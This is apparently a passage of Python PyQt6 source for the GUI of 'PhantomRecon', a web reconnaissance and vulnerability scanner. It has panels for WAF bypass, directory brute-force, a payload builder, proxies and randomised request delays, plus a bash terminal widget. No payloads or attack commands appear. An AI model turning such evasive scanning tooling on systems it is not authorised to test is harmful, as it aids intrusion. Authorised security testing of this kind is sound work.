from __future__ import annotations

import asyncio
import csv
import json as _json
import os
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

from PyQt6.QtCore import (
    QProcess, QPointF, QRectF, QSize, Qt, QThread, pyqtSignal, QTimer, QUrl,
)
from PyQt6.QtGui import (
    QAction, QBrush, QColor, QFont, QIcon, QPalette, QPen, QDesktopServices,
    QTextCharFormat, QTextCursor,
)
from PyQt6.QtWidgets import (
    QApplication, QCheckBox, QComboBox, QFileDialog,
    QFormLayout, QGraphicsEllipseItem, QGraphicsLineItem,
    QGraphicsScene, QGraphicsTextItem, QGraphicsView,
    QGroupBox, QHBoxLayout, QHeaderView, QInputDialog,
    QLabel, QLineEdit, QListWidget, QListWidgetItem,
    QMainWindow, QMenu, QMessageBox,
    QPlainTextEdit, QProgressBar, QPushButton, QRadioButton, QScrollArea,
    QSizePolicy, QSpinBox, QDoubleSpinBox, QSplitter,
    QStatusBar, QSystemTrayIcon, QTabWidget, QTableWidget, QTableWidgetItem,
    QTextBrowser, QTextEdit, QTreeWidget, QTreeWidgetItem,
    QVBoxLayout, QWidget, QFrame, QDialog, QDialogButtonBox,
)

try:
    from matplotlib.backends.backend_qtagg import FigureCanvasQTAgg as FigureCanvas
    from matplotlib.figure import Figure
    HAS_MATPLOTLIB = True
except ImportError:
    HAS_MATPLOTLIB = False

from .config import PROFILES, load_profile, merge_config
from .engine import ScanEngine
from .models import ScanConfig, ScanModule
from .reports.reporter import Reporter


DARK_STYLE = """
QMainWindow, QDialog {
    background-color: #0d0d0d;
    color: #e0e0e0;
}
QWidget {
    background-color: #0d0d0d;
    color: #e0e0e0;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 12px;
}
QGroupBox {
    background-color: #141414;
    border: 1px solid #2a2a2a;
    border-radius: 4px;
    margin-top: 8px;
    padding-top: 8px;
    font-weight: bold;
    color: #00ff41;
}
QGroupBox::title {
    subcontrol-origin: margin;
    left: 8px;
    padding: 0 4px;
    color: #00ff41;
}
QLineEdit, QComboBox, QSpinBox, QDoubleSpinBox {
    background-color: #1a1a1a;
    border: 1px solid #333;
    border-radius: 3px;
    padding: 4px 8px;
    color: #e0e0e0;
    selection-background-color: #00ff41;
    selection-color: #000;
}
QLineEdit:focus, QComboBox:focus, QSpinBox:focus, QDoubleSpinBox:focus {
    border-color: #00ff41;
}
QComboBox::drop-down {
    border: none;
    width: 20px;
}
QComboBox::down-arrow {
    color: #00ff41;
}
QComboBox QAbstractItemView {
    background-color: #1a1a1a;
    border: 1px solid #333;
    selection-background-color: #1a3a1a;
    color: #e0e0e0;
}
QPushButton {
    background-color: #1a1a1a;
    border: 1px solid #333;
    border-radius: 4px;
    padding: 6px 16px;
    color: #e0e0e0;
    font-weight: bold;
}
QPushButton:hover {
    border-color: #00ff41;
    color: #00ff41;
}
QPushButton:pressed {
    background-color: #0a2a0a;
}
QPushButton#startBtn {
    background-color: #0a2a0a;
    border-color: #00ff41;
    color: #00ff41;
    font-size: 13px;
    padding: 8px 24px;
}
QPushButton#startBtn:hover {
    background-color: #0d3d0d;
}
QPushButton#stopBtn {
    background-color: #2a0a0a;
    border-color: #ff0040;
    color: #ff0040;
    font-size: 13px;
    padding: 8px 24px;
}
QPushButton#stopBtn:hover {
    background-color: #3d0d0d;
}
QTabWidget::pane {
    border: 1px solid #2a2a2a;
    background-color: #141414;
}
QTabBar::tab {
    background-color: #1a1a1a;
    border: 1px solid #2a2a2a;
    padding: 6px 16px;
    color: #888;
    margin-right: 2px;
}
QTabBar::tab:selected {
    background-color: #141414;
    color: #00ff41;
    border-bottom-color: #141414;
}
QTabBar::tab:hover {
    color: #e0e0e0;
}
QTableWidget {
    background-color: #141414;
    gridline-color: #2a2a2a;
    border: none;
    alternate-background-color: #181818;
}
QTableWidget::item {
    padding: 4px 8px;
    border: none;
}
QTableWidget::item:selected {
    background-color: #1a3a1a;
    color: #e0e0e0;
}
QHeaderView::section {
    background-color: #1a1a1a;
    border: 1px solid #2a2a2a;
    padding: 6px 8px;
    color: #00ff41;
    font-weight: bold;
}
QScrollBar:vertical {
    background-color: #141414;
    width: 8px;
    border: none;
}
QScrollBar::handle:vertical {
    background-color: #333;
    border-radius: 4px;
    min-height: 20px;
}
QScrollBar::handle:vertical:hover {
    background-color: #00ff41;
}
QScrollBar:horizontal {
    background-color: #141414;
    height: 8px;
    border: none;
}
QScrollBar::handle:horizontal {
    background-color: #333;
    border-radius: 4px;
}
QPlainTextEdit, QTextEdit {
    background-color: #0a0a0a;
    border: 1px solid #2a2a2a;
    color: #00ff41;
    font-family: 'Consolas', 'Courier New', monospace;
    font-size: 11px;
}
QCheckBox {
    color: #e0e0e0;
    spacing: 6px;
}
QCheckBox::indicator {
    width: 14px;
    height: 14px;
    border: 1px solid #333;
    border-radius: 2px;
    background-color: #1a1a1a;
}
QCheckBox::indicator:checked {
    background-color: #00ff41;
    border-color: #00ff41;
}
QLabel {
    color: #e0e0e0;
}
QLabel#headerLabel {
    color: #00ff41;
    font-size: 22px;
    font-weight: bold;
    font-family: 'Consolas', monospace;
}
QLabel#subLabel {
    color: #555;
    font-size: 11px;
}
QProgressBar {
    background-color: #1a1a1a;
    border: 1px solid #2a2a2a;
    border-radius: 3px;
    height: 8px;
    text-align: center;
    color: transparent;
}
QProgressBar::chunk {
    background-color: #00ff41;
    border-radius: 3px;
}
QFrame#separator {
    color: #2a2a2a;
}
QStatusBar {
    background-color: #0a0a0a;
    border-top: 1px solid #2a2a2a;
    color: #555;
}
QScrollArea {
    border: none;
}
QSplitter::handle {
    background-color: #2a2a2a;
    width: 2px;
}
"""

SEV_COLORS = {
    "critical": "#ff0040",
    "high":     "#ff6600",
    "medium":   "#ffcc00",
    "low":      "#4488ff",
    "info":     "#888888",
}

STATUS_COLORS = {
    2: "#00ff41",
    3: "#ffcc00",
    4: "#ff6600",
    5: "#ff0040",
}

LIGHT_STYLE = """
QMainWindow, QDialog { background-color: #f5f5f5; color: #1a1a1a; }
QWidget { background-color: #f5f5f5; color: #1a1a1a;
    font-family: 'Consolas', 'Courier New', monospace; font-size: 12px; }
QGroupBox { background-color: #ffffff; border: 1px solid #cccccc; border-radius: 4px;
    margin-top: 8px; padding-top: 8px; font-weight: bold; color: #007020; }
QGroupBox::title { subcontrol-origin: margin; left: 8px; padding: 0 4px; color: #007020; }
QLineEdit, QComboBox, QSpinBox, QDoubleSpinBox {
    background-color: #ffffff; border: 1px solid #cccccc; border-radius: 3px;
    padding: 4px 8px; color: #1a1a1a; }
QLineEdit:focus, QComboBox:focus { border-color: #007020; }
QComboBox QAbstractItemView { background-color: #ffffff; border: 1px solid #cccccc;
    selection-background-color: #c8e6c9; color: #1a1a1a; }
QPushButton { background-color: #eeeeee; border: 1px solid #cccccc; border-radius: 4px;
    padding: 6px 16px; color: #1a1a1a; font-weight: bold; }
QPushButton:hover { border-color: #007020; color: #007020; }
QPushButton#startBtn { background-color: #c8e6c9; border-color: #007020;
    color: #007020; font-size: 13px; padding: 8px 24px; }
QPushButton#stopBtn { background-color: #ffcdd2; border-color: #c62828;
    color: #c62828; font-size: 13px; padding: 8px 24px; }
QTabWidget::pane { border: 1px solid #cccccc; background-color: #ffffff; }
QTabBar::tab { background-color: #eeeeee; border: 1px solid #cccccc;
    padding: 6px 16px; color: #888; margin-right: 2px; }
QTabBar::tab:selected { background-color: #ffffff; color: #007020; }
QTableWidget { background-color: #ffffff; gridline-color: #e0e0e0; border: none;
    alternate-background-color: #f9f9f9; }
QTableWidget::item:selected { background-color: #c8e6c9; color: #1a1a1a; }
QHeaderView::section { background-color: #eeeeee; border: 1px solid #cccccc;
    padding: 6px 8px; color: #007020; font-weight: bold; }
QPlainTextEdit, QTextEdit { background-color: #1a1a1a; border: 1px solid #cccccc;
    color: #00ff41; font-family: 'Consolas', 'Courier New', monospace; font-size: 11px; }
QCheckBox { color: #1a1a1a; spacing: 6px; }
QCheckBox::indicator { width: 14px; height: 14px; border: 1px solid #aaa;
    border-radius: 2px; background-color: #fff; }
QCheckBox::indicator:checked { background-color: #007020; border-color: #007020; }
QLabel { color: #1a1a1a; }
QLabel#headerLabel { color: #007020; font-size: 22px; font-weight: bold; }
QProgressBar { background-color: #eeeeee; border: 1px solid #cccccc;
    border-radius: 3px; height: 8px; text-align: center; }
QProgressBar::chunk { background-color: #007020; border-radius: 3px; }
QScrollBar:vertical { background-color: #eeeeee; width: 8px; border: none; }
QScrollBar::handle:vertical { background-color: #bbb; border-radius: 4px; min-height: 20px; }
QStatusBar { background-color: #e8e8e8; border-top: 1px solid #cccccc; color: #555; }
QSplitter::handle { background-color: #cccccc; width: 2px; }
"""


class MatplotlibWidget(QWidget):
    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        if HAS_MATPLOTLIB:
            self.fig = Figure(facecolor='#141414')
            self.canvas = FigureCanvas(self.fig)
            self.canvas.setStyleSheet("background: #141414;")
            lay.addWidget(self.canvas)
        else:
            lbl = QLabel("matplotlib not installed.\nRun: pip install matplotlib")
            lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            lbl.setStyleSheet("color:#555;")
            lay.addWidget(lbl)

    def clear_fig(self) -> None:
        if HAS_MATPLOTLIB:
            self.fig.clear()
            self.canvas.draw()

    def draw_severity_bars(self, findings: list) -> None:
        if not HAS_MATPLOTLIB:
            return
        self.fig.clear()
        ax = self.fig.add_subplot(111)
        ax.set_facecolor('#141414')
        self.fig.patch.set_facecolor('#141414')
        sevs   = ['critical', 'high', 'medium', 'low', 'info']
        cols   = ['#ff0040', '#ff6600', '#ffcc00', '#4488ff', '#888888']
        counts = [sum(1 for f in findings if (f.get('severity') or '').lower() == s) for s in sevs]
        bars = ax.bar(sevs, counts, color=cols, edgecolor='#1a1a1a', linewidth=0.5)
        ax.set_title('Findings by Severity', color='#00ff41', pad=8, fontsize=11)
        ax.set_ylabel('Count', color='#888', fontsize=9)
        ax.tick_params(colors='#888', labelsize=9)
        for spine in ax.spines.values():
            spine.set_color('#2a2a2a')
        for bar, cnt in zip(bars, counts):
            if cnt > 0:
                ax.text(bar.get_x() + bar.get_width() / 2, bar.get_height() + 0.1,
                        str(cnt), ha='center', va='bottom', color='#fff', fontsize=9)
        self.fig.tight_layout()
        self.canvas.draw()

    def draw_timeline(self, records: list) -> None:
        if not HAS_MATPLOTLIB:
            return
        self.fig.clear()
        ax = self.fig.add_subplot(111)
        ax.set_facecolor('#141414')
        self.fig.patch.set_facecolor('#141414')
        if not records:
            ax.text(0.5, 0.5, 'No scan history', ha='center', va='center',
                    transform=ax.transAxes, color='#555', fontsize=12)
            self.canvas.draw()
            return
        targets = [r.get('target', '')[:20] for r in records]
        findings = [r.get('findings_count', 0) for r in records]
        x = list(range(len(targets)))
        ax.plot(x, findings, 'o-', color='#00ff41', linewidth=1.5, markersize=5)
        ax.set_xticks(x)
        ax.set_xticklabels(targets, rotation=30, ha='right', fontsize=8, color='#888')
        ax.set_ylabel('Findings', color='#888', fontsize=9)
        ax.set_title('Findings per Scan (History)', color='#00ff41', pad=8, fontsize=11)
        ax.tick_params(colors='#888')
        for spine in ax.spines.values():
            spine.set_color('#2a2a2a')
        self.fig.tight_layout()
        self.canvas.draw()


class NetworkMapWidget(QGraphicsView):
    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self._scene = QGraphicsScene(self)
        self.setScene(self._scene)
        self.setBackgroundBrush(QBrush(QColor('#0a0a0a')))
        self.setDragMode(QGraphicsView.DragMode.ScrollHandDrag)
        self.setTransformationAnchor(QGraphicsView.ViewportAnchor.AnchorUnderMouse)
        self.setStyleSheet("border: none;")

    def wheelEvent(self, event) -> None:
        factor = 1.15 if event.angleDelta().y() > 0 else 0.87
        self.scale(factor, factor)

    def update_map(self, paths: list) -> None:
        import math
        self._scene.clear()
        if not paths:
            txt = self._scene.addText("No paths discovered yet.\nRun a scan first.")
            txt.setDefaultTextColor(QColor('#555'))
            return
        n = min(len(paths), 80)
        radius = max(200, n * 25)
        nc = {2: '#00ff41', 3: '#ffcc00', 4: '#ff6600', 5: '#ff0040'}
        root = self._scene.addEllipse(-14, -14, 28, 28,
                                      QPen(QColor('#00ff41'), 2),
                                      QBrush(QColor('#0a2a0a')))
        rt = self._scene.addText("ROOT")
        rt.setDefaultTextColor(QColor('#00ff41'))
        rt.setFont(QFont('Consolas', 7))
        rt.setPos(-18, 16)
        for i, p in enumerate(paths[:n]):
            angle = (2 * math.pi * i) / n
            x = radius * math.cos(angle)
            y = radius * math.sin(angle)
            status = p.get('status_code', 0)
            col = QColor(nc.get(status // 100, '#555555'))
            self._scene.addLine(0, 0, x, y, QPen(QColor('#1a1a1a'), 1)).setZValue(-1)
            self._scene.addEllipse(x - 7, y - 7, 14, 14, QPen(col, 1), QBrush(QColor('#141414')))
            url = p.get('url', '')
            label = url.rstrip('/').split('/')[-1][:16] or '/'
            t = self._scene.addText(label)
            t.setDefaultTextColor(QColor('#555'))
            t.setFont(QFont('Consolas', 6))
            t.setPos(x + 10, y - 8)
        self._scene.setSceneRect(self._scene.itemsBoundingRect().adjusted(-40, -40, 40, 40))


class TerminalWidget(QWidget):
    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        self._output = QPlainTextEdit()
        self._output.setReadOnly(True)
        self._output.setFont(QFont('Consolas', 10))
        self._output.setMaximumBlockCount(2000)
        self._output.setStyleSheet(
            "background:#0a0a0a; color:#00ff41; border:1px solid #2a2a2a;")
        lay.addWidget(self._output)

        row = QHBoxLayout()
        prompt = QLabel("$")
        prompt.setStyleSheet("color:#00ff41; font-weight:bold;")
        prompt.setFixedWidth(14)
        self._input = QLineEdit()
        self._input.setPlaceholderText(
            "phantomrecon scan https://target.com --profile ghost")
        self._input.returnPressed.connect(self._run_cmd)
        btn_run = QPushButton("▶")
        btn_run.setFixedWidth(30)
        btn_run.setFixedHeight(26)
        btn_run.clicked.connect(self._run_cmd)
        btn_stop = QPushButton("■")
        btn_stop.setFixedWidth(30)
        btn_stop.setFixedHeight(26)
        btn_stop.clicked.connect(self._stop_proc)
        btn_clear = QPushButton("Clear")
        btn_clear.setFixedHeight(26)
        btn_clear.clicked.connect(self._output.clear)
        row.addWidget(prompt)
        row.addWidget(self._input, 1)
        row.addWidget(btn_run)
        row.addWidget(btn_stop)
        row.addWidget(btn_clear)
        lay.addLayout(row)

        self._proc = QProcess(self)
        self._proc.readyReadStandardOutput.connect(self._on_stdout)
        self._proc.readyReadStandardError.connect(self._on_stderr)
        self._proc.finished.connect(
            lambda code, _: self._output.appendPlainText(
                f"\n[Process exited: {code}]"))

    def _run_cmd(self) -> None:
        cmd = self._input.text().strip()
        if not cmd:
            return
        self._output.appendPlainText(f"$ {cmd}")
        self._input.clear()
        if self._proc.state() != QProcess.ProcessState.NotRunning:
            self._proc.kill()
        self._proc.start('bash', ['-c', cmd])

    def _stop_proc(self) -> None:
        if self._proc.state() != QProcess.ProcessState.NotRunning:
            self._proc.kill()
            self._output.appendPlainText("[Process killed]")

    def _on_stdout(self) -> None:
        data = bytes(self._proc.readAllStandardOutput()).decode('utf-8', errors='replace')
        self._output.appendPlainText(data.rstrip('\n'))

    def _on_stderr(self) -> None:
        data = bytes(self._proc.readAllStandardError()).decode('utf-8', errors='replace')
        self._output.appendPlainText(data.rstrip('\n'))


class ScanWorker(QThread):
    event_signal  = pyqtSignal(str, dict)
    finished_signal = pyqtSignal(object)
    error_signal  = pyqtSignal(str)

    def __init__(self, config: ScanConfig) -> None:
        super().__init__()
        self.config = config
        self._engine: Optional[ScanEngine] = None
        self._stopped = False

    def run(self) -> None:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(self._run_scan())
            loop.close()
            if not self._stopped:
                self.finished_signal.emit(result)
        except Exception as e:
            self.error_signal.emit(str(e))

    async def _run_scan(self):
        self._engine = ScanEngine(self.config, ui_callback=self._cb)
        return await self._engine.run()

    def _cb(self, event: str, data: dict) -> None:
        self.event_signal.emit(event, data)

    def stop(self) -> None:
        self._stopped = True
        self.terminate()


class StatBox(QWidget):
    def __init__(self, label: str, value: str = "0", color: str = "#00ff41") -> None:
        super().__init__()
        self.color = color
        layout = QVBoxLayout(self)
        layout.setContentsMargins(12, 8, 12, 8)
        layout.setSpacing(2)

        self.val_label = QLabel(value)
        self.val_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.val_label.setStyleSheet(f"color: {color}; font-size: 22px; font-weight: bold;")

        self.lbl_label = QLabel(label)
        self.lbl_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.lbl_label.setStyleSheet("color: #555; font-size: 10px;")

        layout.addWidget(self.val_label)
        layout.addWidget(self.lbl_label)

        self.setStyleSheet(f"""
            QWidget {{
                background-color: #141414;
                border: 1px solid #2a2a2a;
                border-radius: 4px;
            }}
        """)

    def set_value(self, v: str) -> None:
        self.val_label.setText(v)


class ConsoleWidget(QPlainTextEdit):
    COLORS = {
        "[+]": "#00ff41",
        "[!]": "#ffcc00",
        "[✘]": "#ff0040",
        "[»]": "#4488ff",
        "[~]": "#888888",
        "CRITICAL": "#ff0040",
        "HIGH":     "#ff6600",
        "MEDIUM":   "#ffcc00",
        "LOW":      "#4488ff",
    }

    def __init__(self) -> None:
        super().__init__()
        self.setReadOnly(True)
        self.setMaximumBlockCount(5000)
        self.setFont(QFont("Consolas", 10))

    def append_line(self, text: str, color: str = "#00ff41") -> None:
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        fmt = QTextCharFormat()
        fmt.setForeground(QColor(color))
        ts = datetime.now().strftime("%H:%M:%S")
        cursor.insertText(f"[{ts}] {text}\n", fmt)
        self.setTextCursor(cursor)
        self.ensureCursorVisible()

    def log(self, text: str) -> None:
        color = "#00ff41"
        for prefix, c in self.COLORS.items():
            if prefix in text:
                color = c
                break
        self.append_line(text, color)


class FindingDetailDialog(QDialog):
    def __init__(self, finding: dict, parent=None) -> None:
        super().__init__(parent)
        self.setWindowTitle("Finding Detail")
        self.setMinimumSize(640, 480)
        self.setStyleSheet(DARK_STYLE)

        layout = QVBoxLayout(self)
        layout.setSpacing(12)

        sev = finding.get("severity", "info")
        color = SEV_COLORS.get(sev, "#888")

        title_lbl = QLabel(finding.get("title", ""))
        title_lbl.setStyleSheet(f"color: {color}; font-size: 15px; font-weight: bold;")
        title_lbl.setWordWrap(True)
        layout.addWidget(title_lbl)

        sep = QFrame()
        sep.setFrameShape(QFrame.Shape.HLine)
        sep.setStyleSheet("color: #2a2a2a;")
        layout.addWidget(sep)

        meta = QFormLayout()
        meta.setSpacing(6)
        for k, v in [
            ("Severity", f'<span style="color:{color}">{sev.upper()}</span>'),
            ("URL",      f'<code style="color:#aaa">{finding.get("url","")}</code>'),
            ("Module",   finding.get("module", "")),
            ("CVE",      finding.get("cve") or "—"),
        ]:
            key_lbl = QLabel(f"<b>{k}:</b>")
            val_lbl = QLabel(v)
            val_lbl.setOpenExternalLinks(True)
            val_lbl.setWordWrap(True)
            meta.addRow(key_lbl, val_lbl)
        layout.addLayout(meta)

        for section, key in [("Description", "description"), ("Evidence", "evidence"), ("Recommendation", "recommendation")]:
            content = finding.get(key, "")
            if content:
                lbl = QLabel(f"<b style='color:#00ff41'>{section}</b>")
                layout.addWidget(lbl)
                te = QTextEdit()
                te.setPlainText(content)
                te.setReadOnly(True)
                te.setMaximumHeight(120)
                te.setStyleSheet("background:#0a0a0a; color:#ccc; border:1px solid #2a2a2a; font-size:11px;")
                layout.addWidget(te)

        btn = QDialogButtonBox(QDialogButtonBox.StandardButton.Close)
        btn.rejected.connect(self.reject)
        layout.addWidget(btn)


class PhantomReconGUI(QMainWindow):
    def __init__(self) -> None:
        super().__init__()
        self.setWindowTitle("PhantomRecon — Advanced Web Reconnaissance")
        self.setMinimumSize(1280, 800)
        self.resize(1440, 900)

        self._worker: Optional[ScanWorker] = None
        self._start_time: float = 0
        self._req_count: int = 0
        self._finding_count: int = 0
        self._path_count: int = 0
        self._result = None
        self._findings_data: list[dict] = []
        self._paths_data: list[dict] = []
        self._theme: str = 'dark'
        self._session_file: Optional[str] = None
        self._notif_cfg: dict = {}
        self._custom_payloads: list[str] = []

        self._timer = QTimer()
        self._timer.timeout.connect(self._update_elapsed)

        self.setStyleSheet(DARK_STYLE)
        self._build_ui()
        self._build_menu()

        if QSystemTrayIcon.isSystemTrayAvailable():
            self._tray = QSystemTrayIcon(self)
            self._tray.setToolTip("PhantomRecon")
            tray_menu = QMenu()
            tray_menu.addAction("Show", self.show)
            tray_menu.addAction("Hide", self.hide)
            tray_menu.addSeparator()
            tray_menu.addAction("Exit", self.close)
            self._tray.setContextMenu(tray_menu)
            self._tray.show()
        else:
            self._tray = None

    def _build_menu(self) -> None:
        mb = self.menuBar()
        mb.setStyleSheet("QMenuBar { background-color: #0a0a0a; color: #888; border-bottom: 1px solid #2a2a2a; }"
                         "QMenuBar::item:selected { background-color: #1a1a1a; color: #00ff41; }"
                         "QMenu { background-color: #141414; border: 1px solid #2a2a2a; }"
                         "QMenu::item { padding: 6px 20px; }"
                         "QMenu::item:selected { background-color: #1a3a1a; color: #00ff41; }")

        file_menu = mb.addMenu("File")
        file_menu.addAction("Save Report…", self._save_report)
        file_menu.addSeparator()
        file_menu.addAction("Save Session…", self._save_session)
        file_menu.addAction("Load Session…", self._load_session)
        file_menu.addSeparator()
        file_menu.addAction("Exit", self.close)

        scan_menu = mb.addMenu("Scan")
        scan_menu.addAction("Start Scan", self._start_scan)
        scan_menu.addAction("Stop Scan", self._stop_scan)
        scan_menu.addSeparator()
        scan_menu.addAction("Clear Results", self._clear_results)

        view_menu = mb.addMenu("View")
        self._theme_action = QAction("Switch to Light Theme", self)
        self._theme_action.triggered.connect(self._toggle_theme)
        view_menu.addAction(self._theme_action)
        view_menu.addSeparator()
        for i, name in enumerate(["Console", "Findings", "Paths", "Technologies",
                                   "History", "Network Map", "Diff", "Heatmap",
                                   "Payload Builder", "Report Viewer",
                                   "Proxy Manager", "Terminal", "Notifications"]):
            act = QAction(name, self)
            act.setData(i)
            act.triggered.connect(lambda checked, idx=i: self._tabs.setCurrentIndex(idx))
            view_menu.addAction(act)

        tools_menu = mb.addMenu("Tools")
        tools_menu.addAction("Refresh Network Map", self._refresh_network_map)
        tools_menu.addAction("Refresh Heatmap", self._refresh_heatmap)
        tools_menu.addSeparator()
        tools_menu.addAction("Load Scan History", self._load_history)

        help_menu = mb.addMenu("Help")
        help_menu.addAction("About", self._show_about)

    def _build_ui(self) -> None:
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        root.addWidget(self._build_header())
        root.addWidget(self._build_stats_bar())

        splitter = QSplitter(Qt.Orientation.Horizontal)
        splitter.addWidget(self._build_left_panel())
        splitter.addWidget(self._build_right_panel())
        splitter.setSizes([340, 900])
        splitter.setHandleWidth(3)
        root.addWidget(splitter, 1)

        root.addWidget(self._build_bottom_bar())

        self.statusBar().showMessage("Ready — Configure target and click Start Scan")

    def _build_header(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet("background-color: #0a0a0a; border-bottom: 1px solid #1a1a1a;")
        w.setFixedHeight(64)
        lay = QHBoxLayout(w)
        lay.setContentsMargins(20, 8, 20, 8)

        left = QVBoxLayout()
        title = QLabel("⬡ PHANTOM<span style='color:#555'>RECON</span>")
        title.setObjectName("headerLabel")
        title.setTextFormat(Qt.TextFormat.RichText)
        title.setStyleSheet("color: #00ff41; font-size: 20px; font-weight: bold; font-family: Consolas;")
        sub = QLabel("Silent. Invisible. Deadly Accurate.  |  Advanced Web Reconnaissance & Vulnerability Assessment")
        sub.setObjectName("subLabel")
        sub.setStyleSheet("color: #444; font-size: 10px;")
        left.addWidget(title)
        left.addWidget(sub)
        lay.addLayout(left)

        lay.addStretch()

        from . import __version__
        ver = QLabel(f"v{__version__}")
        ver.setStyleSheet("color: #333; font-size: 11px;")
        lay.addWidget(ver)
        return w

    def _build_stats_bar(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet("background-color: #0d0d0d; border-bottom: 1px solid #1a1a1a;")
        w.setFixedHeight(72)
        lay = QHBoxLayout(w)
        lay.setContentsMargins(16, 8, 16, 8)
        lay.setSpacing(8)

        self._stat_requests  = StatBox("REQUESTS",  "0",  "#00ff41")
        self._stat_findings  = StatBox("FINDINGS",  "0",  "#ffcc00")
        self._stat_critical  = StatBox("CRITICAL",  "0",  "#ff0040")
        self._stat_high      = StatBox("HIGH",      "0",  "#ff6600")
        self._stat_medium    = StatBox("MEDIUM",    "0",  "#ffcc00")
        self._stat_paths     = StatBox("PATHS",     "0",  "#4488ff")
        self._stat_elapsed   = StatBox("ELAPSED",   "00:00", "#888")

        for s in [self._stat_requests, self._stat_findings, self._stat_critical,
                  self._stat_high, self._stat_medium, self._stat_paths, self._stat_elapsed]:
            lay.addWidget(s, 1)
        return w

    def _build_left_panel(self) -> QWidget:
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFixedWidth(340)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)

        container = QWidget()
        scroll.setWidget(container)
        layout = QVBoxLayout(container)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        layout.addWidget(self._build_target_section())
        layout.addWidget(self._build_profile_section())
        layout.addWidget(self._build_modules_section())
        layout.addWidget(self._build_performance_section())
        layout.addWidget(self._build_proxy_section())
        layout.addWidget(self._build_auth_section())
        layout.addWidget(self._build_output_section())
        layout.addStretch()

        return scroll

    def _build_target_section(self) -> QGroupBox:
        g = QGroupBox("TARGET")
        lay = QVBoxLayout(g)
        lay.setSpacing(6)

        self._target_edit = QLineEdit()
        self._target_edit.setPlaceholderText("https://target.example.com")
        self._target_edit.setMinimumHeight(32)
        lay.addWidget(self._target_edit)
        return g

    def _build_profile_section(self) -> QGroupBox:
        g = QGroupBox("SCAN PROFILE")
        lay = QFormLayout(g)
        lay.setSpacing(6)

        self._profile_combo = QComboBox()
        self._profile_combo.addItem("— Custom —", None)
        for name, data in PROFILES.items():
            self._profile_combo.addItem(f"{name}  —  {data['description'][:30]}", name)
        self._profile_combo.currentIndexChanged.connect(self._apply_profile)
        lay.addRow("Profile:", self._profile_combo)
        return g

    def _build_modules_section(self) -> QGroupBox:
        g = QGroupBox("MODULES")
        lay = QVBoxLayout(g)
        lay.setSpacing(4)

        self._module_checks: dict[str, QCheckBox] = {}
        module_labels = {
            "fingerprint": "Technology Fingerprinting",
            "disclosure":  "Information Disclosure",
            "headers":     "Security Headers",
            "ssl":         "SSL/TLS Analysis",
            "methods":     "HTTP Methods",
            "waf":         "WAF Detection & Bypass",
            "vulns":       "Vulnerability Scanning",
            "cms":         "CMS Scanning",
            "api":         "API Scanner",
            "vhost":       "Virtual Host Scanner",
            "crawler":     "Web Crawler",
            "bruteforce":  "Directory Brute-Force",
        }
        for key, label in module_labels.items():
            cb = QCheckBox(label)
            cb.setChecked(True)
            self._module_checks[key] = cb
            lay.addWidget(cb)

        all_row = QHBoxLayout()
        btn_all = QPushButton("All")
        btn_all.setFixedHeight(24)
        btn_all.clicked.connect(lambda: [c.setChecked(True) for c in self._module_checks.values()])
        btn_none = QPushButton("None")
        btn_none.setFixedHeight(24)
        btn_none.clicked.connect(lambda: [c.setChecked(False) for c in self._module_checks.values()])
        all_row.addWidget(btn_all)
        all_row.addWidget(btn_none)
        lay.addLayout(all_row)
        return g

    def _build_performance_section(self) -> QGroupBox:
        g = QGroupBox("PERFORMANCE")
        lay = QFormLayout(g)
        lay.setSpacing(6)

        self._threads_spin = QSpinBox()
        self._threads_spin.setRange(1, 1000)
        self._threads_spin.setValue(50)
        lay.addRow("Threads:", self._threads_spin)

        self._timeout_spin = QSpinBox()
        self._timeout_spin.setRange(1, 300)
        self._timeout_spin.setValue(10)
        self._timeout_spin.setSuffix(" s")
        lay.addRow("Timeout:", self._timeout_spin)

        self._delay_min_spin = QDoubleSpinBox()
        self._delay_min_spin.setRange(0, 60)
        self._delay_min_spin.setValue(0.0)
        self._delay_min_spin.setSingleStep(0.1)
        self._delay_min_spin.setSuffix(" s")
        lay.addRow("Delay min:", self._delay_min_spin)

        self._delay_max_spin = QDoubleSpinBox()
        self._delay_max_spin.setRange(0, 60)
        self._delay_max_spin.setValue(0.5)
        self._delay_max_spin.setSingleStep(0.1)
        self._delay_max_spin.setSuffix(" s")
        lay.addRow("Delay max:", self._delay_max_spin)

        self._rate_spin = QSpinBox()
        self._rate_spin.setRange(0, 1000)
        self._rate_spin.setValue(0)
        self._rate_spin.setSpecialValueText("Unlimited")
        lay.addRow("Rate (req/s):", self._rate_spin)

        self._wordlist_combo = QComboBox()
        for s in ["micro", "small", "medium", "large"]:
            self._wordlist_combo.addItem(s)
        self._wordlist_combo.setCurrentText("medium")
        lay.addRow("Wordlist:", self._wordlist_combo)

        wl_row = QHBoxLayout()
        self._wordlist_edit = QLineEdit()
        self._wordlist_edit.setPlaceholderText("Custom wordlist path…")
        btn_browse = QPushButton("…")
        btn_browse.setFixedWidth(28)
        btn_browse.clicked.connect(self._browse_wordlist)
        wl_row.addWidget(self._wordlist_edit)
        wl_row.addWidget(btn_browse)
        lay.addRow("Custom:", wl_row)

        self._ext_edit = QLineEdit()
        self._ext_edit.setPlaceholderText("php,asp,html,js")
        lay.addRow("Extensions:", self._ext_edit)

        self._recursive_cb = QCheckBox("Recursive scanning")
        lay.addRow("", self._recursive_cb)

        return g

    def _build_proxy_section(self) -> QGroupBox:
